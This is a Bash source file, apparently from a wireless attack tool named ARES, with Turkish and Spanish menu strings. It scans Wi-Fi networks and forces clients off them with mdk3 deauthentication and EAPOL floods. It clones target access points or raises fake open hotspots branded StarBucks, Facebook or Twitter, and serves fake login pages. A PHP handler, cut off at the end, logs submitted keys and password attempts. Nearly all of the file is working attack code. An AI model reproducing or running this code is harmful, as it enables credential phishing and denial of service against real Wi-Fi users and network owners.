    #
    header_askAP="Saldiri Tipi Secin"
    askAP_option_1="SahteAP - Hostapd ("$red"Tavsiye Edilen)"
    askAP_option_2="SahteAP - airbase-ng (Yavas Baglanti)"
    #
    header_askauth="Sifre Kontrol Metodu"
    askauth_option_1="Handshake ("$red"Tavsiye Edilen)"
    askauth_option_2="Wpa_supplicant(Hata Orani Yuksek)"
    #
    header_deauthforce="Handshake Kontrol"
    deauthforce_option_1="aircrack-ng (Hata Sansı Var)"
    #
    header_deauthMENU="*Kaydet Handshake*"
    deauthMENU_option_1="Kontrol Et handshake"
    #
    handshakelocation_1="handshake Dizini  (Ornek: $red$WORK_DIR.cap$transparent)"
    handshakelocation_2="Tusa Bas ${yellow}ENTER$transparent Gecmek icin"
    #
    header_webinterface="Secenegi Sec"
    header_ConnectionRESET="Giris Sayfasini Sec"
    #
    general_back="Geri"
    general_error_1="Bulunamadi"
    general_case_error="Bilinmeyen Secenek. Tekrar Seciniz"
    general_exitmode="Temizleniyor ve Kapatiliyor"
    general_exitmode_1="Monitor modu kapatiliyor"
    general_exitmode_2="Ag Arayuzu kapatiliyor"
    general_exitmode_3="Kapatiliyor "$grey"forwarding of packets"
    general_exitmode_4="Temizleniyor "$grey"iptables"
    general_exitmode_5="Yenileniyor "$grey"tput"
    general_exitmode_6="Tekrar Baslatiliyor "$grey"Network-Manager"
    general_exitmode_7="Temizlik Basariyla Tamamlandi!"
    general_exitmode_8="ARES kullandiginiz icin tesekkurler."
    #
    selection_1="Aktif kullanicilar"
    selection_2="Tekrar taramak icin Hedef seciniz type$red r$transparent"
    generalMenu
}

function spain {
	header_setinterface="Seleccione una interfase"
    setinterface_error="No hay tarjetas inalambricas, saliendo..."

    #
    header_choosescan="Seleccione canal"
    choosescan_option_1="Todos los canales "
    choosescan_option_2="Canal(es) específico(s)"
    #
    scanchan_option_1="Canal único"
    scanchan_option_2="Canales múltiples"
    #
    header_scan="WIFI Monitor"
    #
    header_scanchan="Escaneando objetivo"
    #
    header_askAP="Seleccione Opción de Ataque"
    askAP_option_1="FakeAP - Hostapd ("$red"Recomendado)"
    askAP_option_2="FakeAP - airbase-ng (Conexión más lenta)"
    #
    header_askauth="MÉTODO PARA VERIFICAR CONTRASEÑA"
    askauth_option_1="Handshake ("$red"Recomendado)"
    askauth_option_2="Wpa_supplicant(Más Fallas)"
    #
    header_deauthforce="Chequeo de Handshake"
    deauthforce_option_1="aircrack-ng (Posibilidad de error)"
    #
    header_deauthMENU="*Capturar Handshake*"
    deauthMENU_option_1="Chequear handshake"
    #
    handshakelocation_1="ubicación del handshake  (Ejemplo: $red$WORK_DIR.cap$transparent)"
    handshakelocation_2="Presione ${yellow}ENTER$transparent para saltar"
    #
    header_webinterface="Seleccione su opción"
    header_ConnectionRESET="Seleccione página de Login"
    #
    general_back="Atrás"
    general_error_1="No_Encontrado"
    general_case_error="Opción desconocida. Elija de nuevo"
    general_exitmode="Limpiando y cerrando"
    general_exitmode_1="Deshabilitando interfaz de monitoreo"
    general_exitmode_2="Deshabilitando interfaz"
    general_exitmode_3="Deshabilitando "$grey"reenvio de paquetes"
    general_exitmode_4="Limpiando "$grey"iptables"
    general_exitmode_5="Restaurando "$grey"tput"
    general_exitmode_6="Reiniciando "$grey"Network-Manager"
    general_exitmode_7="Limpieza realizada satisfactoriamente!"
    general_exitmode_8="Gracias por usar ARES"
    #
    selection_1="Clientes activos"
    selection_2="Seleccione objetivo. Para reescanear teclee$red r$transparent"
	generalMenu

}

function generalMenu {

	conditional_clear

	while true; do
		conditional_clear
		top

		echo "Select a option"
		echo "                                       "
		echo -e "      "$blue"1)"$transparent" Start a Hotspot          "
		echo -e "      "$blue"2)"$transparent" Capture traffic       "
		echo -e "      "$blue"3)"$red" Back" $transparent
		echo "                                       "
		echo -n "      #> "
		read yn
		echo ""
		case $yn in
			1 ) hotspotSelection ; break ;;
			2 ) dumper ; break ;;
			3 ) exitmode; break;;
			* ) echo "Unknown option. Please choose again"; conditional_clear ;;
		  esac
	done
}

function hotspotSelection {

	conditional_clear

	while true; do
		conditional_clear
		top

		echo "Select a option"
		echo "                                       "
		echo -e "      "$blue"1)"$transparent" Clone WIFI + Deauth        "
		echo -e "      "$blue"2)"$transparent" Use a template      "
		echo -e "      "$blue"3)"$transparent" manually       "
		echo -e "      "$blue"4)"$red" Back" $transparent
		echo "                                       "
		echo -n "      #> "
		read yn
		echo ""
		case $yn in
			1 ) setinterface ; break ;;
			2 ) setinterfaceweb ; break ;;
			3 ) manually; break;;
			4 ) exitmode; break;;
			* ) echo "Unknown option. Please choose again"; conditional_clear ;;
		  esac
	done
}

function template {

conditional_clear

	while true; do
		conditional_clear
		top

		echo "Select a option"
		echo "                                       "
		echo -e "      "$blue"1)"$transparent" StarBucks        "
		echo -e "      "$blue"2)"$transparent" Telekom     "
		echo -e "      "$blue"3)"$transparent" UHC       "
		echo -e "      "$blue"4)"$transparent" FREEWIFI       "
		echo -e "      "$blue"5)"$transparent" Facebook       "
		echo -e "      "$blue"6)"$transparent" Twitter       "
		echo -e "      "$blue"7)"$transparent" Custom_name or channel?       "
		echo -e "      "$blue"8)"$red" Exit" $transparent
		echo "                                       "
		echo -n "      #> "
		read yn
		echo ""
		case $yn in
			1 ) Host_SSID="StarBucks";Host_ENC="OPEN";Host_CHAN="1";channel="1";speed="54";Host_MAC="C0:EE:FB:52:8B:45"; Host_MAC_MODEL="Telekom";fakeapmode="hostapd";authmode="hostapdAP";selectiontemplate; break;;
			2 ) Host_SSID="Telekom";Host_ENC="OPEN";Host_CHAN="1";channel="1";speed="54";Host_MAC="C0:EE:FB:52:8B:45"; Host_MAC_MODEL="Telekom";fakeapmode="hostapd";authmode="hostapdAP";selectiontemplate; break;;
			3 ) Host_SSID="UHC";Host_ENC="OPEN";Host_CHAN="1";channel="1";speed="54";Host_MAC="C0:EE:FB:52:8B:45"; Host_MAC_MODEL="Telekom";fakeapmode="hostapd";authmode="hostapdAP";selectiontemplate; break;;
			4 ) Host_SSID="FREEWIFI";Host_ENC="OPEN";Host_CHAN="1";channel="1";speed="54";Host_MAC="C0:EE:FB:52:8B:45"; Host_MAC_MODEL="Telekom";fakeapmode="hostapd";authmode="hostapdAP";selectiontemplate; break;;
			5 ) Host_SSID="Facebook";Host_ENC="OPEN";Host_CHAN="1";channel="1";speed="54";Host_MAC="C0:EE:FB:52:8B:45"; Host_MAC_MODEL="Telekom";fakeapmode="hostapd";authmode="hostapdAP";selectiontemplate; break;;
			6 ) Host_SSID="Twitter";Host_ENC="OPEN";Host_CHAN="1";channel="1";speed="54";Host_MAC="C0:EE:FB:52:8B:45"; Host_MAC_MODEL="Telekom";fakeapmode="hostapd";authmode="hostapdAP";selectiontemplate; break;;
			7 ) Custom_name?; break;;
			8 ) exitmode; break;;
			* ) echo "Unknown option. Please choose again";conditional_clear ;;
		  esac
	done

}
function Custom_name? {
		echo -n "Enter hotspot name    #> "
		read cn
		channelx
	}
function channelx {
	echo -e "Enter channel if you want to deauth another network while hosting Ares's hotspot"
	echo -n " Enter channel [press enter for default] #> "
	read cx
	case $cx in
	1 ) Host_SSID="$cn";Host_ENC="OPEN";Host_CHAN="1";channel="1";speed="54";Host_MAC="C0:EE:FB:52:8B:45"; Host_MAC_MODEL="Telekom";fakeapmode="hostapd";authmode="hostapdAP";selectiontemplate; break;;
	2 ) Host_SSID="$cn";Host_ENC="OPEN";Host_CHAN="2";channel="2";speed="54";Host_MAC="C0:EE:FB:52:8B:45"; Host_MAC_MODEL="Telekom";fakeapmode="hostapd";authmode="hostapdAP";selectiontemplate; break;;
	3 ) Host_SSID="$cn";Host_ENC="OPEN";Host_CHAN="3";channel="3";speed="54";Host_MAC="C0:EE:FB:52:8B:45"; Host_MAC_MODEL="Telekom";fakeapmode="hostapd";authmode="hostapdAP";selectiontemplate; break;;
	4 ) Host_SSID="$cn";Host_ENC="OPEN";Host_CHAN="4";channel="4";speed="54";Host_MAC="C0:EE:FB:52:8B:45"; Host_MAC_MODEL="Telekom";fakeapmode="hostapd";authmode="hostapdAP";selectiontemplate; break;;
	5 ) Host_SSID="$cn";Host_ENC="OPEN";Host_CHAN="5";channel="5";speed="54";Host_MAC="C0:EE:FB:52:8B:45"; Host_MAC_MODEL="Telekom";fakeapmode="hostapd";authmode="hostapdAP";selectiontemplate; break;;
	6 ) Host_SSID="$cn";Host_ENC="OPEN";Host_CHAN="6";channel="6";speed="54";Host_MAC="C0:EE:FB:52:8B:45"; Host_MAC_MODEL="Telekom";fakeapmode="hostapd";authmode="hostapdAP";selectiontemplate; break;;
	7 ) Host_SSID="$cn";Host_ENC="OPEN";Host_CHAN="7";channel="7";speed="54";Host_MAC="C0:EE:FB:52:8B:45"; Host_MAC_MODEL="Telekom";fakeapmode="hostapd";authmode="hostapdAP";selectiontemplate; break;;
	8 ) Host_SSID="$cn";Host_ENC="OPEN";Host_CHAN="8";channel="8";speed="54";Host_MAC="C0:EE:FB:52:8B:45"; Host_MAC_MODEL="Telekom";fakeapmode="hostapd";authmode="hostapdAP";selectiontemplate; break;;
	9 ) Host_SSID="$cn";Host_ENC="OPEN";Host_CHAN="9";channel="9";speed="54";Host_MAC="C0:EE:FB:52:8B:45"; Host_MAC_MODEL="Telekom";fakeapmode="hostapd";authmode="hostapdAP";selectiontemplate; break;;
	10 ) Host_SSID="$cn";Host_ENC="OPEN";Host_CHAN="10";channel="10";speed="54";Host_MAC="C0:EE:FB:52:8B:45"; Host_MAC_MODEL="Telekom";fakeapmode="hostapd";authmode="hostapdAP";selectiontemplate; break;;
	11 ) Host_SSID="$cn";Host_ENC="OPEN";Host_CHAN="11";channel="11";speed="54";Host_MAC="C0:EE:FB:52:8B:45"; Host_MAC_MODEL="Telekom";fakeapmode="hostapd";authmode="hostapdAP";selectiontemplate; break;;
	12 ) Host_SSID="$cn";Host_ENC="OPEN";Host_CHAN="12";channel="12";speed="54";Host_MAC="C0:EE:FB:52:8B:45"; Host_MAC_MODEL="Telekom";fakeapmode="hostapd";authmode="hostapdAP";selectiontemplate; break;;
	13 ) Host_SSID="$cn";Host_ENC="OPEN";Host_CHAN="13";channel="13";speed="54";Host_MAC="C0:EE:FB:52:8B:45"; Host_MAC_MODEL="Telekom";fakeapmode="hostapd";authmode="hostapdAP";selectiontemplate; break;;
	14 ) Host_SSID="$cn";Host_ENC="OPEN";Host_CHAN="14";channel="14";speed="54";Host_MAC="C0:EE:FB:52:8B:45"; Host_MAC_MODEL="Telekom";fakeapmode="hostapd";authmode="hostapdAP";selectiontemplate; break;;
	* ) echo -e "This is not a channel number_- " && sleep 0.3 && echo -e "ignoring this channel number" && sleep 0.3 && echo -e "channel=1" && sleep 0.3 && Host_SSID="$cn";Host_ENC="OPEN";Host_CHAN="1";channel="1";speed="54";Host_MAC="C0:EE:FB:52:8B:45"; Host_MAC_MODEL="Telekom";fakeapmode="hostapd";authmode="hostapdAP";selectiontemplate; break;;
	esac
	}

function setinterface2 {

	conditional_clear
	top
	#unblock interfaces
	rfkill unblock all


	# Create a variable with the list of physical network interfaces
	readarray -t wirelessifaces < <(./airmon |grep "-" | cut -d- -f1)
	INTERFACESNUMBER=`./airmon| grep -c "-"`


	if [ "$INTERFACESNUMBER" -gt "0" ]; then

		echo $header_setinterface
		echo
		i=0

		for line in "${wirelessifaces[@]}"; do
			i=$(($i+1))
			wirelessifaces[$i]=$line
			echo -e "$blue ""$i)"$transparent" $line"
		done
		echo
		echo -n "#? "
		read line
		PREWIFI=$(echo ${wirelessifaces[$line]} | awk '{print $1}')

	fi
}
function dumper {
setinterface2
xterm $HOLD -title "Collect Data" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e tcpdump -w DUMP_PATH/dump.pcap -i $PREWIFI
wait 5

top
echo
echo -e ""$red" File is saved in /tmp/TMPARES/dump.pcap" $transparent
echo
wait 3
generalMenu


}

# Choose Interface
function setinterfaceweb {
	conditional_clear
	top
	#unblock interfaces
	rfkill unblock all

	# Collect all interfaces in montitor mode & stop all
	KILLMONITOR=`iwconfig 2>&1 | grep Monitor | awk '{print $1}'`

	for monkill in ${KILLMONITOR[@]}; do
		airmon-ng stop $monkill >$ares_output_device
		echo -n "$monkill, "
	done

	# Create a variable with the list of physical network interfaces
	readarray -t wirelessifaces < <(./airmon |grep "-" | cut -d- -f1)
	INTERFACESNUMBER=`./airmon| grep -c "-"`


	if [ "$INTERFACESNUMBER" -gt "0" ]; then

		echo $header_setinterface
		echo
		i=0

		for line in "${wirelessifaces[@]}"; do
			i=$(($i+1))
			wirelessifaces[$i]=$line
			echo -e "$blue ""$i)"$transparent" $line"
		done
		echo
		echo -n "#? "
		read line
		PREWIFI=$(echo ${wirelessifaces[$line]} | awk '{print $1}')

		if [ $(echo "$PREWIFI" | wc -m) -le 3 ]; then
			conditional_clear
			top
			setinterface
		fi

		readarray -t softwaremolesto < <(./airmon check $PREWIFI | tail -n +8 | grep -v "on interface" | awk '{ print $2 }')
		WIFIDRIVER=$(./airmon | grep "$PREWIFI" | awk '{print($(NF-2))}')
		rmmod -f "$WIFIDRIVER" &>$ares_output_device 2>&1

		for molesto in "${softwaremolesto[@]}"; do
			killall "$molesto" &>$ares_output_device
		done
		sleep 0.5

		modprobe "$WIFIDRIVER" &>$ares_output_device 2>&1
		sleep 0.5
		# Select Wifi Interface
		select PREWIFI in $INTERFACES; do
			break;
		done

		WIFIMONITOR=$(./airmon start $PREWIFI | grep "enabled on" | cut -d " " -f 5 | cut -d ")" -f 1)
		WIFI_MONITOR=$WIFIMONITOR
		WIFI=$PREWIFI

		#No wireless cards
	else

		echo $setinterface_error
		sleep 5
		exitmode
	fi

	template
}
# Choose Interface
function setinterface {
	conditional_clear
	top
	#unblock interfaces
	rfkill unblock all

	# Collect all interfaces in montitor mode & stop all
	KILLMONITOR=`iwconfig 2>&1 | grep Monitor | awk '{print $1}'`

	for monkill in ${KILLMONITOR[@]}; do
		airmon-ng stop $monkill >$ares_output_device
		echo -n "$monkill, "
	done

	# Create a variable with the list of physical network interfaces
	readarray -t wirelessifaces < <(./airmon |grep "-" | cut -d- -f1)
	INTERFACESNUMBER=`./airmon| grep -c "-"`


	if [ "$INTERFACESNUMBER" -gt "0" ]; then

		echo $header_setinterface
		echo
		i=0

		for line in "${wirelessifaces[@]}"; do
			i=$(($i+1))
			wirelessifaces[$i]=$line
			echo -e "$blue ""$i)"$transparent" $line"
		done
		echo
		echo -n "#? "
		read line
		PREWIFI=$(echo ${wirelessifaces[$line]} | awk '{print $1}')

		if [ $(echo "$PREWIFI" | wc -m) -le 3 ]; then
			conditional_clear
			top
			setinterface
		fi

		readarray -t softwaremolesto < <(./airmon check $PREWIFI | tail -n +8 | grep -v "on interface" | awk '{ print $2 }')
		WIFIDRIVER=$(./airmon | grep "$PREWIFI" | awk '{print($(NF-2))}')
		rmmod -f "$WIFIDRIVER" &>$ares_output_device 2>&1

		for molesto in "${softwaremolesto[@]}"; do
			killall "$molesto" &>$ares_output_device
		done
		sleep 0.5

		modprobe "$WIFIDRIVER" &>$ares_output_device 2>&1
		sleep 0.5
		# Select Wifi Interface
		select PREWIFI in $INTERFACES; do
			break;
		done

		WIFIMONITOR=$(./airmon start $PREWIFI | grep "enabled on" | cut -d " " -f 5 | cut -d ")" -f 1)
		WIFI_MONITOR=$WIFIMONITOR
		WIFI=$PREWIFI

		#No wireless cards
	else

		echo $setinterface_error
		sleep 5
		exitmode
	fi

	deltax
}

# Check files
function deltax {

	conditional_clear
	CSVDB=dump-01.csv

	rm -rf $DUMP_PATH/*

	choosescan
	selection
}

# Select channel
function choosescan {

	conditional_clear

	while true; do
		conditional_clear
		top

		echo "$header_choosescan"
		echo "                                       "
		echo -e "      "$blue"1)"$transparent" $choosescan_option_1          "
		echo -e "      "$blue"2)"$transparent" $choosescan_option_2       "
		echo "                                       "
		echo -n "      #> "
		read yn
		echo ""
		case $yn in
			1 ) Scan ; break ;;
			2 ) Scanchan ; break ;;
			* ) echo "Unknown option. Please choose again"; conditional_clear ;;
		  esac
	done
}

# Choose your channel if you choose option 2 before
function Scanchan {

	conditional_clear
	top

	  echo "                                       "
	  echo "$header_choosescan     "
	  echo "                                       "
	  echo -e "     $scanchan_option_1 "$blue"6"$transparent"               "
	  echo -e "     $scanchan_option_2 "$blue"1-5"$transparent"             "
	  echo -e "     $scanchan_option_2 "$blue"1,2,5-7,11"$transparent"      "
	  echo "                                       "
	echo -n "      #> "
	read channel_number
	set -- ${channel_number}
	conditional_clear

	rm -rf $DUMP_PATH/dump*
	xterm $HOLD -title "$header_scanchan [$channel_number]" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e airodump-ng -w $DUMP_PATH/dump --channel "$channel_number" -a $WIFI_MONITOR --ignore-negative-one
}

# Scans the entire network
function Scan {

	conditional_clear
	rm -rf $DUMP_PATH/dump*
	xterm $HOLD -title "$header_scan" $TOPLEFTBIG -bg "#FFFFFF" -fg "#000000" -e airodump-ng -w $DUMP_PATH/dump -a $WIFI_MONITOR --ignore-negative-one
}

# choose a network
function selection {

	conditional_clear


	LINEAS_WIFIS_CSV=`wc -l $DUMP_PATH/$CSVDB | awk '{print $1}'`

	if [ $LINEAS_WIFIS_CSV -le 3 ]; then
		deltax && break
	fi

	ARESap=`cat $DUMP_PATH/$CSVDB | egrep -a -n '(Station|Cliente)' | awk -F : '{print $1}'`
	ARESap=`expr $ARESap - 1`
	head -n $ARESap $DUMP_PATH/$CSVDB &> $DUMP_PATH/dump-02.csv
	tail -n +$ARESap $DUMP_PATH/$CSVDB &> $DUMP_PATH/clientes.csv
	echo "                        WIFI LIST "
	echo ""
	echo " #      MAC                      CHAN    SECU     PWR    ESSID"
	echo ""
	i=0

	while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY;do
		longueur=${#MAC}
		PRIVACY=$(echo $PRIVACY| tr -d "^ ")
		PRIVACY=${PRIVACY:0:4}
		if [ $longueur -ge 17 ]; then
			i=$(($i+1))
			POWER=`expr $POWER + 100`
			CLIENTE=`cat $DUMP_PATH/clientes.csv | grep $MAC`

			if [ "$CLIENTE" != "" ]; then
				CLIENTE="*"
			fi

			echo -e " ""$green "$i")"$white"$CLIENTE\t""$yellow"$MAC"\t""$green "$CHANNEL"\t""$red" $PRIVACY"\t  ""$yellow"$POWER%"\t""$green "$ESSID""$transparent""
			aidlenght=$IDLENGTH
			assid[$i]=$ESSID
			achannel[$i]=$CHANNEL
			amac[$i]=$MAC
			aprivacy[$i]=$PRIVACY
			aspeed[$i]=$SPEED
		fi
	done < $DUMP_PATH/dump-02.csv
	echo
	echo -e ""$green "("$white"*"$green ")$selection_1"$transparent""
	echo ""
	echo "        Select Target              "
	echo -n "      #> "
	read choice
	idlenght=${aidlenght[$choice]}
	ssid=${assid[$choice]}
	channel=$(echo ${achannel[$choice]}|tr -d [:space:])
	mac=${amac[$choice]}
	privacy=${aprivacy[$choice]}
	speed=${aspeed[$choice]}
	Host_IDL=$idlength
	Host_SPEED=$speed
	Host_ENC=$privacy
	Host_MAC=$mac
	Host_CHAN=$channel
	acouper=${#ssid}
	fin=$(($acouper-idlength))
	Host_SSID=${ssid:1:fin}
	conditional_clear

	askAP


}


# choose a network
function selectiontemplate {

	conditional_clear
	top

	echo "                        WIFI LIST "
	echo ""
	echo " #      MAC                      CHAN    SECU     PWR    ESSID"
	echo -e "" $transparent"1)"$red"     $Host_MAC"$blue"          $Host_CHAN"$yellow"     $Host_ENC"$purple"     100"$green"    $Host_SSID" $transparent
	echo ""
	echo "        Select Target              "
	echo -n "      #> "
	read coice



	while true; do

		conditional_clear
		top
		infoap

		echo "          #### $header_askAP ####"
		echo "                                       "
		echo -e "      "$blue"1)"$transparent" $askAP_option_1"
		echo -e "      "$blue"2)"$transparent" $askAP_option_2"
		echo -e "      "$blue"3)"$red" $general_back" $transparent""
		echo "                                       "
		echo -n "      #> "
		read yn
		echo ""
		case $yn in
			1 ) fakeapmode="hostapd";authmode="hostapdAP"; certssl; break ;;
			2 ) fakeapmode="airbase-ng";authmode="wpa_supplicant";certssl; break ;;
			3 ) selection; break ;;
			* ) echo "$general_case_error"; conditional_clear ;;
		esac
	done


}

# FakeAP
function askAP {

	DIGITOS_WIFIS_CSV=`echo "$Host_MAC" | wc -m`

	if [ $DIGITOS_WIFIS_CSV -le 15 ]; then
		selection && break
	fi

	if [ "$(echo $WIFIDRIVER | grep -i 8187)" ]; then
		fakeapmode="airbase-ng"
		askauth
	fi

	top
	while true; do

		infoap

		echo "          #### $header_askAP ####"
		echo "                                       "
		echo -e "      "$blue"1)"$transparent" $askAP_option_1"
		echo -e "      "$blue"2)"$transparent" $askAP_option_2"
		echo -e "      "$blue"3)"$red" $general_back" $transparent""
		echo "                                       "
		echo -n "      #> "
		read yn
		echo ""
		case $yn in
			1 ) fakeapmode="hostapd";authmode="hostapdAP"; webinterface; break ;;
			2 ) fakeapmode="airbase-ng";authmode="wpa_supplicant";certssl; break ;;
			3 ) selection; break ;;
			* ) echo "$general_case_error"; conditional_clear ;;
		esac
	done

}

run_mdk3_ASOC1()
{
	xterm -e "timeout 60 mdk3 $WIFI_MONITOR1 a -a $mac -m"
}

run_mdk3_EAPOL1()
{
	xterm -e "timeout 20s mdk3 $WIFI_MONITOR1 x 0 -t $mac -n $ssid -s 250"
}

run_mdk3_ASOC2()
{
sleep 1
ifconfig $WIFI_MONITOR2 up
sleep 1
	xterm -e "timeout 60 mdk3 $WIFI_MONITOR1 a -a $mac -m & timeout 60 mdk3 $WIFI_MONITOR2 a -a $mac -m"
sleep 1
ifconfig $WIFI_MONITOR2 down
sleep 1
}

run_mdk3_EAPOL2()
{
sleep 1
ifconfig $WIFI_MONITOR2 up
sleep 1
	xterm -e "timeout 20s mdk3 $WIFI_MONITOR1 x 0 -t $mac -n $ssid -s 250 & timeout 20s mdk3 $WIFI_MONITOR2 x 0 -t $mac -n $ssid -s 250"
sleep 1
ifconfig $WIFI_MONITOR2 down
sleep 1
}

run_mdk3_ASOC3()
{
sleep 1
ifconfig $WIFI_MONITOR2 up
sleep 1
ifconfig $WIFI_MONITOR3 up
sleep 1
	xterm -e "timeout 60 mdk3 $WIFI_MONITOR1 a -a $mac -m & timeout 60 mdk3 $WIFI_MONITOR2 a -a $mac -m & timeout 60 mdk3 $WIFI_MONITOR3 a -a $mac -m"
sleep 1
ifconfig $WIFI_MONITOR2 down
sleep 1
ifconfig $WIFI_MONITOR3 down
sleep 1
}

run_mdk3_EAPOL3()
{
sleep 1
ifconfig $WIFI_MONITOR2 up
sleep 1
ifconfig $WIFI_MONITOR3 up
sleep 1
	xterm -e "timeout 20s mdk3 $WIFI_MONITOR1 x 0 -t $mac -n $ssid -s 250 & timeout 20s mdk3 $WIFI_MONITOR2 x 0 -t $mac -n $ssid -s 250 & timeout 20s mdk3 $WIFI_MONITOR3 x 0 -t $mac -n $ssid -s 250"
sleep 1
ifconfig $WIFI_MONITOR2 down
sleep 1
ifconfig $WIFI_MONITOR3 down
sleep 1
}

run_mdk3_ASOC4()
{
sleep 1
ifconfig $WIFI_MONITOR2 up
sleep 1
ifconfig $WIFI_MONITOR3 up
sleep 1
ifconfig $WIFI_MONITOR4 up
sleep 1
	xterm -e "timeout 60 mdk3 $WIFI_MONITOR1 a -a $mac -m & timeout 60 mdk3 $WIFI_MONITOR2 a -a $mac -m & timeout 60 mdk3 $WIFI_MONITOR3 a -a $mac -m & timeout 60 mdk3 $WIFI_MONITOR4 a -a $mac -m"
sleep 1
ifconfig $WIFI_MONITOR2 down
sleep 1
ifconfig $WIFI_MONITOR3 down
sleep 1
ifconfig $WIFI_MONITOR4 down
sleep 1
}

run_mdk3_EAPOL4()
{
sleep 1
ifconfig $WIFI_MONITOR2 up
sleep 1
ifconfig $WIFI_MONITOR3 up
sleep 1
ifconfig $WIFI_MONITOR4 up
sleep 1
	xterm -e "timeout 20s mdk3 $WIFI_MONITOR1 x 0 -t $mac -n $ssid -s 250 & timeout 20s mdk3 $WIFI_MONITOR2 x 0 -t $mac -n $ssid -s 250 & timeout 20s mdk3 $WIFI_MONITOR3 x 0 -t $mac -n $ssid -s 250 & timeout 20s mdk3 $WIFI_MONITOR4 x 0 -t $mac -n $ssid -s 250"
sleep 1
ifconfig $WIFI_MONITOR2 down
sleep 1
ifconfig $WIFI_MONITOR3 down
sleep 1
ifconfig $WIFI_MONITOR4 down
sleep 1
}

run_mdk3_ASOC5()
{
sleep 1
ifconfig $WIFI_MONITOR2 up
sleep 1
ifconfig $WIFI_MONITOR3 up
sleep 1
ifconfig $WIFI_MONITOR4 up
sleep 1
ifconfig $WIFI_MONITOR5 up
sleep 1
	xterm -e "timeout 60 mdk3 $WIFI_MONITOR1 a -a $mac -m & timeout 60 mdk3 $WIFI_MONITOR2 a -a $mac -m & timeout 60 mdk3 $WIFI_MONITOR3 a -a $mac -m & timeout 60 mdk3 $WIFI_MONITOR4 a -a $mac -m & timeout 60 mdk3 $WIFI_MONITOR5 a -a $mac -m"
sleep 1
ifconfig $WIFI_MONITOR2 down
sleep 1
ifconfig $WIFI_MONITOR3 down
sleep 1
ifconfig $WIFI_MONITOR4 down
sleep 1
ifconfig $WIFI_MONITOR5 down
sleep 1
}

run_mdk3_EAPOL5()
{
sleep 1
ifconfig $WIFI_MONITOR2 up
sleep 1
ifconfig $WIFI_MONITOR3 up
sleep 1
ifconfig $WIFI_MONITOR4 up
sleep 1
ifconfig $WIFI_MONITOR5 up
sleep 1
	xterm -e "timeout 20s mdk3 $WIFI_MONITOR1 x 0 -t $mac -n $ssid -s 250 & timeout 20s mdk3 $WIFI_MONITOR2 x 0 -t $mac -n $ssid -s 250 & timeout 20s mdk3 $WIFI_MONITOR3 x 0 -t $mac -n $ssid -s 250 & timeout 20s mdk3 $WIFI_MONITOR4 x 0 -t $mac -n $ssid -s 250 & timeout 20s mdk3 $WIFI_MONITOR5 x 0 -t $mac -n $ssid -s 250"
sleep 1
ifconfig $WIFI_MONITOR2 down
sleep 1
ifconfig $WIFI_MONITOR3 down
sleep 1
ifconfig $WIFI_MONITOR4 down
sleep 1
ifconfig $WIFI_MONITOR5 down
sleep 1
}

# Select web interface that will be used
function webinterface {

#Establece Permisos al Certificado ssl Autofirmado
	chmod 400 $DUMP_PATH/server.pem

	while true; do
		conditional_clear
		top

		infoap
		echo
		echo "$header_webinterface"
		echo

		echo -e "$blue""      1)"$transparent" Web Interface"
		echo -e "$blue""      2)"$transparent" \e[1;31mExit"$transparent""

		echo
		echo -n "#? "
		read yn
		case $yn in
		1 ) matartodo; ConnectionRESET; selection; break;;
		2 ) matartodo; exitmode; break;;
		esac
	done
}

# function for ssl
function certssl {
# Test if the ssl certificate is generated correcly if there is any

		if [ -f /root/server.pem ]; then
		if [ -s /root/server.pem ]; then

		webinterface
		break
	else
		conditional_clear
		top
		echo "                                       "
		echo "  Certificate invalid or not present, please choice"
		echo "                                       "
		echo -e "      "$blue"1)"$transparent" Create  a SSL certificate"
		echo -e "      "$blue"2)"$transparent" Search for SSl certificate" # hop to certssl check again
		echo -e "      "$blue"3)"$red" Exit" $transparent
		echo " "
		echo -n '      #> '
		read yn

		case $yn in
			1 ) creassl;;
			2 ) certssl;break;;
			3 ) exitmode; break;;
			* ) echo "$general_case_error"; conditional_clear
		esac
		fi
	else
		while true; do
		conditional_clear
		top
		echo "                                    	                            "
		echo "  Certificate invalid or not present, please choice"
		echo "                                       "
		echo -e "      "$blue"1)"$transparent" Create  a SSL certificate"
		echo -e "      "$blue"2)"$transparent" Search for SSl certificate" # hop to certssl check again
		echo -e "      "$blue"3)"$red" Exit" $transparent
		echo " "
		echo -n '      #> '
		read yn

		case $yn in
			1 ) creassl;;
			2 ) certssl; break;;
			3 ) exitmode; break;;
			* ) echo "$general_case_error"; conditional_clear
		esac

	done

	fi


}

# Create Self-Signed SSL Certificate
function creassl {
	xterm -title "Create Self-Signed SSL Certificate" -e openssl req -subj '/CN=SEGURO/O=SEGURA/OU=SEGURA/C=US' -new -newkey rsa:2048 -days 365 -nodes -x509 -keyout /root/server.pem -out /root/server.pem # more details there https://www.openssl.org/docs/manmaster/apps/openssl.html
	certssl
}

function ConnectionRESET {

		while true; do
			conditional_clear
			top
			infoap
			echo
			echo "$header_ConnectionRESET"
			echo


			echo -e "$blue""1)"$transparent" Facebook		[ENG] "
			echo -e "$blue""2)"$transparent" Twitter		[ENG] "
			echo -e "$blue""3)"$transparent" Starbucks-Facebook	[ENG] "
			echo -e "$blue""4)"$transparent"\e[1;31m $general_back"$transparent""

			echo
			echo -n "#? "
			read aresass
			language=${webinterfaceslenguage[$line]}

			if [ "$aresass" = "1" ]; then
                                Facebook
                                break

                       elif [ "$aresass" = "2" ]; then
				Twitter
				break
                       elif [ "$aresass" = "3" ]; then
				Starbucks
				break
                       elif [ "$aresass" = "4" ]; then
				continue
			fi

	done
	preattack
	attack
}
# Create different settings required for the script
function preattack {

# Config HostAPD
echo "interface=$WIFI
driver=nl80211
ssid=$Host_SSID
channel=$Host_CHAN
">$DUMP_PATH/hostapd.conf

# Creates PHP
echo "<?php
error_reporting(0);

\$count_my_page = (\"$DUMP_PATH/hit.txt\");
\$hits = file(\$count_my_page);
\$hits[0] ++;
\$fp = fopen(\$count_my_page , \"w\");
fputs(\$fp , \"\$hits[0]\");
fclose(\$fp);

// Receive form Post data and Saving it in variables

\$key1 = @\$_POST['key1'];

// Write the name of text file where data will be store
\$filename = \"$DUMP_PATH/data.txt\";
\$filename2 = \"$DUMP_PATH/status.txt\";
\$intento = \"$DUMP_PATH/intento\";
\$attemptlog = \"$DUMP_PATH/pwattempt.txt\";


// Marge all the variables with text in a single variable.
\$f_data= ''.\$key1.'';

